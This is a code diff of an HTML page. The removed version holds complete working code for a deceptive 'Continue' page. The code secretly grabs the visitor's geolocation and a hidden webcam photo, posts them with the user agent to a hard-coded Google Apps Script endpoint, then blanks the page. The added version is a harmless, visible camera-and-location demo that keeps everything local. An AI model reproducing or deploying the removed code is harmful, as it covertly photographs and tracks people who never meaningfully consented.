@@ -2,51 +2,66 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Capture Photo + Location</title>
+  <title>Location & Camera Access</title>
+  <style>
+    body {
+      font-family: Arial;
+      text-align: center;
+      margin-top: 50px;
+    }
+    video, img {
+      width: 90%;
+      max-width: 400px;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
-  <button id="startBtn">Continue</button>
-  <video id="video" autoplay playsinline style="display:none"></video>
-  <canvas id="canvas" style="display:none"></canvas>
 
-  <script>
-    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxt1zH4hyC1OEaC83G64_rm2CE1KBvPtLCapr5golHoTXHom8Sqwe1L2S7-5BZS40bM/exec"; // Replace with your Web App URL
+<h2>Click to Continue</h2>
+<button onclick="start()">Continue</button>
 
-    document.getElementById("startBtn").addEventListener("click", async () => {
-      let locationData = null;
+<p id="location"></p>
 
-      try {
-        const pos = await new Promise((res, rej) =>
-          navigator.geolocation.getCurrentPosition(res, rej)
-        );
-        locationData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
-      } catch(e) { console.log("Location denied"); }
+<video id="video" autoplay playsinline></video>
+<br>
+<button onclick="capture()">Capture Photo</button>
+<br>
+<img id="photo">
 
-      let photoData = null;
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 1500));
-        const canvas = document.getElementById("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
-        photoData = canvas.toDataURL("image/jpeg");
-        stream.getTracks().forEach(t => t.stop());
-      } catch(e) { console.log("Camera denied"); }
+<script>
+let video = document.getElementById("video");
 
-      try {
-        const res = await fetch(WEB_APP_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ location: locationData, device: navigator.userAgent, photo: photoData })
-        });
-        console.log(await res.text());
-      } catch(e) { console.error("POST failed:", e); }
+async function start() {
+  // 📍 LOCATION
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        document.getElementById("location").innerText =
+          "Latitude: " + pos.coords.latitude +
+          "\nLongitude: " + pos.coords.longitude;
+      },
+      err => alert("Location permission denied")
+    );
+  }
 
-      document.body.innerHTML = "";
-    });
-  </script>
+  // 📷 CAMERA
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+  } catch (err) {
+    alert("Camera permission denied");
+  }
+}
+
+function capture() {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+  document.getElementById("photo").src = canvas.toDataURL("image/png");
+}
+</script>
+
 </body>
 </html>
